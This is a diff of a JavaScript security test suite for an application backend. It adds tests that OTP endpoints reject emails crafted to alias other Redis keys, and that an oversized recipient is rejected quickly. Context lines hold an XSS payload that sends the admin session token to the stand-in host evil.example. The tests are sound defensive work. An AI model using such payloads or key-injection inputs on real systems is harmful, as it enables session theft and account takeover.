@@ -109,6 +109,26 @@ check('correct OTP → 200 with a session token', r.statusCode === 200 && !!r.bo
 const applicantToken = r.body?.session?.token;
 
 // ════════════════════════════════════════════════════════════════════
+section('SEC  OTP emails cannot alias other Redis keys');
+
+const victimResetKey = 'bcci:otp:reset:victim@example.com';
+mock.store.set(victimResetKey, JSON.stringify('123456'));
+for (const bad of ['reset:victim@example.com', 'Evil<victim@example.com>', 'a,victim@example.com', 'daily:victim@example.com']) {
+  r = await call(sendOtp, { method: 'POST', body: { email: bad } });
+  check(`send-otp rejects ${bad} → 400`, r.statusCode === 400, `got ${r.statusCode}`);
+}
+check("the victim's reset OTP key is untouched", mock.store.get(victimResetKey) === JSON.stringify('123456'));
+
+r = await call(verifyOtp, { method: 'POST', body: { email: 'reset:victim@example.com', code: '123456' } });
+check('verify-otp rejects reset:victim@example.com → 400', r.statusCode === 400, `got ${r.statusCode}`);
+check("verify-otp did not consume the victim's reset OTP key", mock.store.get(victimResetKey) === JSON.stringify('123456'));
+
+r = await call(sendOtp, { method: 'POST', body: { email: 'First.Last+tag@Example.co.in' } });
+check('send-otp still accepts First.Last+tag@Example.co.in', r.statusCode === 200, JSON.stringify(r.body));
+r = await call(sendOtp, { method: 'POST', body: { email: "o'brien@example.com" } });
+check("send-otp still accepts o'brien@example.com", r.statusCode === 200, JSON.stringify(r.body));
+
+// ════════════════════════════════════════════════════════════════════
 section('BUG-01  Submitted applications are visible to the admin');
 
 const XSS = '<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bcci_admin_session)">';
@@ -575,6 +595,17 @@ r = await call(sendEmailRoute, {
   body: { type: 'application_approved', to: 'member@example.com', data: { appId: 'X', company: 'Y', repName: 'Z', validUntil: 'now' } },
 });
 check('internal secret → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
+
+{
+  const started = Date.now();
+  r = await call(sendEmailRoute, {
+    method: 'POST', token: 'internal-secret-value',
+    body: { type: 'application_approved', to: `a@${'.'.repeat(40000)}@`, data: { appId: 'X', company: 'Y', repName: 'Z', validUntil: 'now' } },
+  });
+  const elapsed = Date.now() - started;
+  check('40k-character recipient → 400', r.statusCode === 400, `got ${r.statusCode}`);
+  check('40k-character recipient is rejected in under 200 ms', elapsed < 200, `took ${elapsed} ms`);
+}
 
 // Template escaping
 const { TEMPLATES } = await import(`${BCCI}/_lib/email.js`);
